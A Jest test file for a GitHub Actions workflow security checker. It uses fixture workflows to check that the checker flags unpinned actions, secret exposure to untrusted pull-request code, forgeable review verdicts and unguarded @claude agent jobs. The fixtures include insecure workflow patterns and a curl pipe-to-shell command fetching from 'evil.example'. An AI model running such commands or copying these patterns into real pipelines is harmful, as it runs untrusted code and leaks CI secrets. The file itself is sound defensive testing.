import {
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { parse } from 'yaml';
import { checkGithubWorkflowSecurity } from './check-github-workflow-security';

function readWorkflow(relativePath: string): Record<string, unknown> {
  return parse(
    readFileSync(join(process.cwd(), relativePath), 'utf8'),
  ) as Record<string, unknown>;
}

function workflowOn(
  workflow: Record<string, unknown>,
): Record<string, unknown> {
  return (workflow.on ?? workflow.true) as Record<string, unknown>;
}

function jobIf(workflow: Record<string, unknown>, jobId: string): string {
  const jobs = workflow.jobs as Record<string, { if?: unknown }>;
  return String(jobs[jobId]?.if ?? '');
}

function normalizeExpression(value: string): string {
  return value.replace(/\s+/g, ' ').trim();
}

const expectedCheckAffectedIf = [
  "github.event_name == 'workflow_dispatch' ||",
  '(',
  "github.event.workflow_run.conclusion == 'success' &&",
  "github.event.workflow_run.event == 'push' &&",
  "github.event.workflow_run.head_branch == 'main' &&",
  'github.event.workflow_run.head_repository.full_name == github.repository',
  ')',
].join(' ');

const expectedBuildPreviewIf = [
  'always() &&',
  "github.event_name == 'workflow_run' &&",
  "github.event.workflow_run.event == 'push' &&",
  "github.event.workflow_run.head_branch == 'main' &&",
  'github.event.workflow_run.head_repository.full_name == github.repository &&',
  "needs.check-affected.result == 'success' &&",
  "needs.check-affected.outputs.mobile-affected == 'true' &&",
  "needs.check-affected.outputs.native-changed == 'true'",
].join(' ');

function expectSensitiveMobileIfExpressions(workflow: Record<string, unknown>) {
  const checkAffectedIf = normalizeExpression(
    jobIf(workflow, 'check-affected'),
  );
  expect(checkAffectedIf).toBe(expectedCheckAffectedIf);
  expect(checkAffectedIf).not.toMatch(/\|\|\s*true\b|true\s*\|\|/);

  const buildPreviewIf = normalizeExpression(jobIf(workflow, 'build-preview'));
  expect(buildPreviewIf).toBe(expectedBuildPreviewIf);
  expect(buildPreviewIf).not.toMatch(/\|\|\s*true\b|true\s*\|\|/);
}

function writeFixture(root: string, relativePath: string, content: string) {
  const filePath = join(root, relativePath);
  mkdirSync(dirname(filePath), { recursive: true });
  writeFileSync(filePath, `${dedent(content)}\n`);
}

function dedent(content: string): string {
  const lines = content.replace(/^\n/, '').replace(/\s+$/, '').split('\n');
  const indents = lines
    .filter((line) => line.trim())
    .map((line) => line.match(/^ */)?.[0].length ?? 0);
  const minIndent = Math.min(...indents);
  return lines.map((line) => line.slice(minIndent)).join('\n');
}

function messages(root: string): string {
  return checkGithubWorkflowSecurity(root)
    .map((violation) => violation.message)
    .join('\n');
}

describe('checkGithubWorkflowSecurity', () => {
  let root: string;

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), 'github-workflow-security-'));
  });

  afterEach(() => {
    rmSync(root, { recursive: true, force: true });
  });

  it('rejects mutable external action refs', () => {
    writeFixture(
      root,
      '.github/workflows/bad.yml',
      `
      name: Bad
      on: pull_request
      jobs:
        test:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@v4
      `,
    );

    expect(messages(root)).toContain(
      'actions/checkout@v4 must be pinned to a 40-character SHA',
    );
  });

  it('allows external action refs pinned to immutable SHAs', () => {
    writeFixture(
      root,
      '.github/workflows/good.yml',
      `
      name: Good
      on: pull_request
      jobs:
        test:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
      `,
    );

    expect(checkGithubWorkflowSecurity(root)).toEqual([]);
  });

  it('rejects mutable external reusable workflow refs', () => {
    writeFixture(
      root,
      '.github/workflows/bad-reusable-workflow.yml',
      `
      name: Bad reusable workflow
      on: pull_request
      jobs:
        delegated:
          uses: owner/repo/.github/workflows/test.yml@main
      `,
    );

    expect(messages(root)).toContain(
      'owner/repo/.github/workflows/test.yml@main must be pinned to a 40-character SHA',
    );
  });

  it('allows external reusable workflow refs pinned to immutable SHAs', () => {
    writeFixture(
      root,
      '.github/workflows/good-reusable-workflow.yml',
      `
      name: Good reusable workflow
      on: pull_request
      jobs:
        delegated:
          uses: owner/repo/.github/workflows/test.yml@34e114876b0b11c390a56381ad16ebd13914f8d5
      `,
    );

    expect(checkGithubWorkflowSecurity(root)).toEqual([]);
  });

  it('rejects local actions that receive secrets in pull_request workflows', () => {
    writeFixture(
      root,
      '.github/workflows/bad-local-secret.yml',
      `
      name: Bad local secret
      on: pull_request
      jobs:
        review:
          runs-on: ubuntu-latest
          steps:
            - uses: ./.github/actions/claude-review
              with:
                oauth_token: \${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
      `,
    );

    expect(messages(root)).toContain(
      'local action receives secrets in a pull_request workflow',
    );
  });

  it('rejects local actions that receive bracket-style secrets in pull_request workflows', () => {
    writeFixture(
      root,
      '.github/workflows/bad-local-bracket-secret.yml',
      `
      name: Bad local bracket secret
      on: pull_request
      jobs:
        review:
          runs-on: ubuntu-latest
          steps:
            - uses: ./.github/actions/claude-review
              with:
                oauth_token: \${{ secrets['CLAUDE_CODE_OAUTH_TOKEN'] }}
      `,
    );

    expect(messages(root)).toContain(
      'local action receives secrets in a pull_request workflow',
    );
  });

  it('rejects local actions that receive secrets in pull_request_target workflows', () => {
    writeFixture(
      root,
      '.github/workflows/bad-local-secret-target.yml',
      `
      name: Bad local secret target
      on: pull_request_target
      jobs:
        review:
          runs-on: ubuntu-latest
          steps:
            - uses: ./.github/actions/claude-review
              with:
                oauth_token: \${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
      `,
    );

    expect(messages(root)).toContain(
      'local action receives secrets in a pull_request workflow',
    );
  });

  it('allows local actions without secrets in pull_request workflows', () => {
    writeFixture(
      root,
      '.github/workflows/good-local.yml',
      `
      name: Good local
      on: pull_request
      jobs:
        review:
          runs-on: ubuntu-latest
          steps:
            - uses: ./.github/actions/lint
              with:
                mode: strict
      `,
    );

    expect(checkGithubWorkflowSecurity(root)).toEqual([]);
  });

  it('allows trusted-base local actions to receive secrets in pull_request workflows', () => {
    writeFixture(
      root,
      '.github/workflows/good-trusted-local-secret.yml',
      `
      name: Good trusted local secret
      on: pull_request
      jobs:
        review:
          runs-on: ubuntu-latest
          steps:
            - uses: ./.trusted-actions/.github/actions/claude-review
              with:
                oauth_token: \${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
      `,
    );

    expect(checkGithubWorkflowSecurity(root)).toEqual([]);
  });

  it('rejects local pull_request actions that inherit workflow-level secret env', () => {
    writeFixture(
      root,
      '.github/workflows/bad-local-workflow-env.yml',
      `
      name: Bad local inherited workflow env
      on: pull_request
      env:
        TOKEN: \${{ secrets.TEST_TOKEN }}
      jobs:
        review:
          runs-on: ubuntu-latest
          steps:
            - uses: ./.github/actions/review
      `,
    );

    expect(messages(root)).toContain(
      'local action receives secrets in a pull_request workflow',
    );
  });

  it('rejects local pull_request actions that inherit job-level secret env', () => {
    writeFixture(
      root,
      '.github/workflows/bad-local-job-env.yml',
      `
      name: Bad local inherited job env
      on: pull_request
      jobs:
        review:
          runs-on: ubuntu-latest
          env:
            TOKEN: \${{ secrets.TEST_TOKEN }}
          steps:
            - uses: ./.github/actions/review
      `,
    );

    expect(messages(root)).toContain(
      'local action receives secrets in a pull_request workflow',
    );
  });

  it('rejects workflow_run jobs that expose secrets to pull_request head code', () => {
    writeFixture(
      root,
      '.github/workflows/bad-workflow-run.yml',
      `
      name: Bad workflow run
      on:
        workflow_run:
          workflows: ["CI"]
      jobs:
        e2e:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
              with:
                ref: \${{ github.event.workflow_run.head_sha }}
            - run: echo "$TEST_SEED_SECRET"
              env:
                TEST_SEED_SECRET: \${{ secrets.TEST_SEED_SECRET }}
      `,
    );

    expect(messages(root)).toContain(
      'workflow_run exposes secrets while checking out head_sha',
    );
  });

  it('rejects workflow_run jobs that expose bracket-style secrets to pull_request head code', () => {
    writeFixture(
      root,
      '.github/workflows/bad-workflow-run-bracket-secret.yml',
      `
      name: Bad workflow run bracket secret
      on:
        workflow_run:
          workflows: ["CI"]
      jobs:
        e2e:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
              with:
                ref: \${{ github.event.workflow_run.head_sha }}
            - run: echo "$TEST_SEED_SECRET"
              env:
                TEST_SEED_SECRET: \${{ secrets['TEST_SEED_SECRET'] }}
      `,
    );

    expect(messages(root)).toContain(
      'workflow_run exposes secrets while checking out head_sha',
    );
  });

  it('rejects workflow_run jobs that inherit workflow-level secret env while checking out head code', () => {
    writeFixture(
      root,
      '.github/workflows/bad-workflow-run-workflow-env.yml',
      `
      name: Bad workflow run workflow env
      on:
        workflow_run:
          workflows: ["CI"]
      env:
        TEST_SEED_SECRET: \${{ secrets.TEST_SEED_SECRET }}
      jobs:
        e2e:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
              with:
                ref: \${{ github.event.workflow_run.head_sha }}
            - run: pnpm test:e2e
      `,
    );

    expect(messages(root)).toContain(
      'workflow_run exposes secrets while checking out head_sha',
    );
  });

  it('allows secret-bearing workflow_run jobs that carry a self-contained fork-exclusion guard alongside the skip output', () => {
    writeFixture(
      root,
      '.github/workflows/good-workflow-run-pr-skip.yml',
      `
      name: Good workflow run PR skip
      on:
        workflow_run:
          workflows: ["CI"]
      jobs:
        check-changes:
          runs-on: ubuntu-latest
          outputs:
            run-mobile-e2e: \${{ steps.analyze.outputs.run-mobile-e2e }}
          steps:
            - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
              with:
                ref: \${{ github.event.workflow_run.head_sha }}
            - name: Analyze changed file types
              id: analyze
              run: |
                if [ "\${{ github.event_name }}" = "workflow_run" ] && [ "\${{ github.event.workflow_run.event }}" = "pull_request" ]; then
                  echo "run-mobile-e2e=false" >> "$GITHUB_OUTPUT"
                  exit 0
                fi
        e2e:
          needs: check-changes
          if: >-
            needs.check-changes.outputs.run-mobile-e2e == 'true' &&
            github.event.workflow_run.event != 'pull_request' &&
            github.event.workflow_run.head_repository.full_name == github.repository
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
              with:
                ref: \${{ github.event.workflow_run.head_sha }}
            - run: pnpm test:e2e
              env:
                TEST_SEED_SECRET: \${{ secrets.TEST_SEED_SECRET }}
      `,
    );

    expect(checkGithubWorkflowSecurity(root)).toEqual([]);
  });

  // [F-154] A secret-bearing workflow_run job that checks out head_sha must
  // carry its OWN fork-exclusion guard; relying solely on an upstream
  // skip-output is a single point of failure.
  it('rejects secret-bearing workflow_run jobs gated solely by an upstream skip output (no self-contained guard)', () => {
    writeFixture(
      root,
      '.github/workflows/bad-workflow-run-sole-output-gate.yml',
      `
      name: Bad workflow run sole output gate
      on:
        workflow_run:
          workflows: ["CI"]
      jobs:
        check-changes:
          runs-on: ubuntu-latest
          outputs:
            run-mobile-e2e: \${{ steps.analyze.outputs.run-mobile-e2e }}
          steps:
            - name: Analyze changed file types
              id: analyze
              run: |
                if [ "\${{ github.event_name }}" = "workflow_run" ] && [ "\${{ github.event.workflow_run.event }}" = "pull_request" ]; then
                  echo "run-mobile-e2e=false" >> "$GITHUB_OUTPUT"
                  exit 0
                fi
        e2e:
          needs: check-changes
          if: needs.check-changes.outputs.run-mobile-e2e == 'true'
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
              with:
                ref: \${{ github.event.workflow_run.head_sha }}
            - run: pnpm test:e2e
              env:
                TEST_SEED_SECRET: \${{ secrets.TEST_SEED_SECRET }}
      `,
    );

    expect(messages(root)).toContain(
      'secret-bearing workflow_run job relies solely on an upstream skip output',
    );
  });

  it('rejects workflow_run jobs with inverted pull_request skip-output conditions', () => {
    writeFixture(
      root,
      '.github/workflows/bad-workflow-run-inverted-skip.yml',
      `
      name: Bad workflow run inverted skip
      on:
        workflow_run:
          workflows: ["CI"]
      jobs:
        check-changes:
          runs-on: ubuntu-latest
          outputs:
            run-mobile-e2e: \${{ steps.analyze.outputs.run-mobile-e2e }}
          steps:
            - name: Analyze changed file types
              id: analyze
              run: |
                if [ "\${{ github.event_name }}" = "workflow_run" ] && [ "\${{ github.event.workflow_run.event }}" = "pull_request" ]; then
                  echo "run-mobile-e2e=false" >> "$GITHUB_OUTPUT"
                  exit 0
                fi
        e2e:
          needs: check-changes
          if: needs.check-changes.outputs.run-mobile-e2e == 'false'
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
              with:
                ref: \${{ github.event.workflow_run.head_sha }}
            - run: pnpm test:e2e
              env:
                TEST_SEED_SECRET: \${{ secrets.TEST_SEED_SECRET }}
      `,
    );

    expect(messages(root)).toContain(
      'workflow_run exposes secrets while checking out head_sha',
    );
  });

  it('rejects workflow_run jobs with bypassable pull_request skip-output conditions', () => {
    writeFixture(
      root,
      '.github/workflows/bad-workflow-run-bypassable-skip.yml',
      `
      name: Bad workflow run bypassable skip
      on:
        workflow_run:
          workflows: ["CI"]
      jobs:
        check-changes:
          runs-on: ubuntu-latest
          outputs:
            run-mobile-e2e: \${{ steps.analyze.outputs.run-mobile-e2e }}
          steps:
            - name: Analyze changed file types
              id: analyze
              run: |
                if [ "\${{ github.event_name }}" = "workflow_run" ] && [ "\${{ github.event.workflow_run.event }}" = "pull_request" ]; then
                  echo "run-mobile-e2e=false" >> "$GITHUB_OUTPUT"
                  exit 0
                fi
        e2e:
          needs: check-changes
          if: always() || needs.check-changes.outputs.run-mobile-e2e == 'true'
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
              with:
                ref: \${{ github.event.workflow_run.head_sha }}
            - run: pnpm test:e2e
              env:
                TEST_SEED_SECRET: \${{ secrets.TEST_SEED_SECRET }}
      `,
    );

    expect(messages(root)).toContain(
      'workflow_run exposes secrets while checking out head_sha',
    );
  });

  it('allows workflow_run jobs that do not expose secrets', () => {
    writeFixture(
      root,
      '.github/workflows/good-workflow-run.yml',
      `
      name: Good workflow run
      on:
        workflow_run:
          workflows: ["CI"]
      jobs:
        inspect:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
              with:
                ref: \${{ github.event.workflow_run.head_sha }}
            - run: pnpm test
      `,
    );

    expect(checkGithubWorkflowSecurity(root)).toEqual([]);
  });

  it('rejects curl pipe-to-shell installers without checksum verification', () => {
    writeFixture(
      root,
      '.github/workflows/bad-installer.yml',
      `
      name: Bad installer
      on: workflow_dispatch
      jobs:
        test:
          runs-on: ubuntu-latest
          steps:
            - run: curl -Ls https://get.maestro.mobile.dev | bash
      `,
    );

    expect(messages(root)).toContain(
      'pipe-to-shell installer must be replaced or checksum-verified',
    );
  });

  it('rejects pipe-to-shell installers even when another artifact is checksum verified', () => {
    writeFixture(
      root,
      '.github/workflows/bad-installer-unrelated-checksum.yml',
      `
      name: Bad installer unrelated checksum
      on: workflow_dispatch
      jobs:
        test:
          runs-on: ubuntu-latest
          steps:
            - run: |
                curl -Ls https://evil.example/install.sh | bash
                curl -fsSLO https://example.test/tool.tar.gz
                curl -fsSLO https://example.test/checksums.txt
                grep " tool.tar.gz$" checksums.txt | sha256sum -c -
      `,
    );

    expect(messages(root)).toContain(
      'pipe-to-shell installer must be replaced or checksum-verified',
    );
  });

  it('allows curl downloads that are checksum verified before install', () => {
    writeFixture(
      root,
      '.github/workflows/good-installer.yml',
      `
      name: Good installer
      on: workflow_dispatch
      jobs:
        test:
          runs-on: ubuntu-latest
          steps:
            - run: |
                curl -fsSLO https://example.test/tool.tar.gz
                curl -fsSLO https://example.test/checksums.txt
                grep " tool.tar.gz$" checksums.txt | sha256sum -c -
                sudo tar -xzf tool.tar.gz -C /usr/local/bin tool
      `,
    );

    expect(checkGithubWorkflowSecurity(root)).toEqual([]);
  });

  it('requires mobile workflow_run builds to come from successful push on main in this repository', () => {
    const workflow = readWorkflow('.github/workflows/mobile-ci.yml');
    const on = workflowOn(workflow);

    expect(on).toHaveProperty('workflow_run');
    expect(on).toHaveProperty('workflow_dispatch');
    expect(
      (
        (on.workflow_dispatch as { inputs?: Record<string, { type?: string }> })
          .inputs ?? {}
      ).skip_tests?.type,
    ).toBe('boolean');

    expectSensitiveMobileIfExpressions(workflow);
  });

  it('rejects bypassable mobile workflow_run guard expressions', () => {
    const workflow = readWorkflow('.github/workflows/mobile-ci.yml');
    const jobs = workflow.jobs as Record<string, { if?: unknown }>;
    jobs['build-preview'].if = `${jobs['build-preview'].if} || true`;

    expect(() => expectSensitiveMobileIfExpressions(workflow)).toThrow('toBe');
  });

  // [F-132] The review-verdict gate must not parse a comment as the verdict
  // source unless the comment author is constrained to a trusted bot identity.
  // Otherwise a PR author can post the verdict marker and forge the gate.
  it('rejects a verdict gate that selects comments without a trusted-author constraint', () => {
    writeFixture(
      root,
      '.github/workflows/bad-verdict-gate.yml',
      `
      name: Bad verdict gate
      on: pull_request
      jobs:
        review:
          runs-on: ubuntu-latest
          steps:
            - name: Evaluate review verdict
              run: |
                comments_json="$(gh api "repos/\${REPO}/issues/\${PR_NUMBER}/comments" --paginate)"
                review_json="$(jq -c '[ .[] | select(.body | contains("## Claude Code Review:")) ] | last' <<< "$comments_json")"
      `,
    );

    expect(messages(root)).toContain(
      'verdict gate parses comments without constraining the comment author to a trusted bot identity (forgeable verdict)',
    );
  });

  it('rejects a verdict gate whose only author reference is a no-op author_association mention', () => {
    writeFixture(
      root,
      '.github/workflows/bad-verdict-gate-noop-author.yml',
      `
      name: Bad verdict gate noop author
      on: pull_request
      jobs:
        review:
          runs-on: ubuntu-latest
          steps:
            - name: Evaluate review verdict
              run: |
                # author_association is checked elsewhere
                comments_json="$(gh api "repos/\${REPO}/issues/\${PR_NUMBER}/comments" --paginate)"
                review_json="$(jq -c '[ .[] | select(.body | contains("## Claude Code Review:")) ] | last' <<< "$comments_json")"
      `,
    );

    expect(messages(root)).toContain(
      'verdict gate parses comments without constraining the comment author to a trusted bot identity (forgeable verdict)',
    );
  });

  it('allows a verdict gate that constrains the comment author to github-actions[bot]', () => {
    writeFixture(
      root,
      '.github/workflows/good-verdict-gate.yml',
      `
      name: Good verdict gate
      on: pull_request
      jobs:
        review:
          runs-on: ubuntu-latest
          steps:
            - name: Evaluate review verdict
              run: |
                comments_json="$(gh api "repos/\${REPO}/issues/\${PR_NUMBER}/comments" --paginate)"
                review_json="$(jq -c '[ .[] | select(.user.login == "github-actions[bot]") | select(.body | contains("## Claude Code Review:")) ] | last' <<< "$comments_json")"
      `,
    );

    expect(checkGithubWorkflowSecurity(root)).toEqual([]);
  });

  // [F-119] A secret-backed @claude agent job triggered by issue/comment/review
  // events must gate on a trusted author_association, or any external account
  // can invoke the secret-backed path by mentioning @claude.
  it('rejects an @claude secret-backed agent without an author_association guard', () => {
    writeFixture(
      root,
      '.github/workflows/bad-claude-agent.yml',
      `
      name: Bad claude agent
      on:
        issue_comment:
          types: [created]
        issues:
          types: [opened]
      jobs:
        claude:
          if: github.event_name == 'issue_comment' && contains(github.event.comment.body, '@claude')
          runs-on: ubuntu-latest
          steps:
            - uses: anthropics/claude-code-action@20c8abf165d5f85ab3fc970db9498436377dc9d1
              with:
                claude_code_oauth_token: \${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
      `,
    );

    expect(messages(root)).toContain(
      '@claude secret-backed agent must gate on a trusted author_association',
    );
  });

  it('rejects an @claude secret-backed agent whose author_association is a bare no-op mention', () => {
    writeFixture(
      root,
      '.github/workflows/bad-claude-agent-noop-author.yml',
      `
      name: Bad claude agent noop author
      on:
        issue_comment:
          types: [created]
      jobs:
        claude:
          # Real @claude mention gate, but author_association appears only as a
          # bare unenforced token in a string literal — no field ref, no allowlist.
          if: github.event_name == 'issue_comment' && contains(github.event.comment.body, '@claude') && contains(github.event.comment.body, 'author_association')
          runs-on: ubuntu-latest
          steps:
            - uses: anthropics/claude-code-action@20c8abf165d5f85ab3fc970db9498436377dc9d1
              with:
                claude_code_oauth_token: \${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
      `,
    );

    expect(messages(root)).toContain(
      '@claude secret-backed agent must gate on a trusted author_association',
    );
  });

  it('allows an @claude secret-backed agent that gates on a trusted author_association', () => {
    writeFixture(
      root,
      '.github/workflows/good-claude-agent.yml',
      `
      name: Good claude agent
      on:
        issue_comment:
          types: [created]
        issues:
          types: [opened]
      jobs:
        claude:
          if: |
            github.event_name == 'issue_comment' && contains(github.event.comment.body, '@claude') &&
            contains(fromJSON('["OWNER","MEMBER","COLLABORATOR"]'), github.event.comment.author_association)
          runs-on: ubuntu-latest
          steps:
            - uses: anthropics/claude-code-action@20c8abf165d5f85ab3fc970db9498436377dc9d1
              with:
                claude_code_oauth_token: \${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
      `,
    );

    expect(checkGithubWorkflowSecurity(root)).toEqual([]);
  });
});
